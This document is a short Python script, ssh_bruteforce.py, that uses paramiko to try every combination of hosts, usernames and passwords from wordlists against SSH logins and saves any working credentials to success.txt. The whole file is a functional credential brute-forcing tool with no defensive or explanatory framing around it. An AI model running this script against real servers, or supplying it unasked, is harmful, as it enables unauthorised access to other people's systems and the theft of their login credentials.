import paramiko
import sys

# Check if the correct number of arguments is provided
if len(sys.argv) != 5:
    print("Usage: python ssh_bruteforce.py hosts.txt username.txt password.txt port")
    sys.exit(1)

# Assign arguments to variables
hosts_file = sys.argv[1]
user_file = sys.argv[2]
pass_file = sys.argv[3]
port = int(sys.argv[4])

# Output file for successful attempts
success_file = "success.txt"

# Read hosts, usernames, and passwords
with open(hosts_file, 'r') as hf, open(user_file, 'r') as uf, open(pass_file, 'r') as pf:
    hosts = [line.strip() for line in hf]
    usernames = [line.strip() for line in uf]
    passwords = [line.strip() for line in pf]

# Clear or create the success file
with open(success_file, 'w') as sf:
    pass

# Function to attempt SSH connection
def try_ssh(host, username, password, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password, timeout=5)
        client.close()
        return True
    except:
        return False

# Attempt all combinations
for host in hosts:
    for username in usernames:
        for password in passwords:
            if try_ssh(host, username, password, port):
                with open(success_file, 'a') as sf:
                    sf.write(f"{host} {username}:{password}\n")
                print(f"SUCCESS: {host} {username}:{password}")

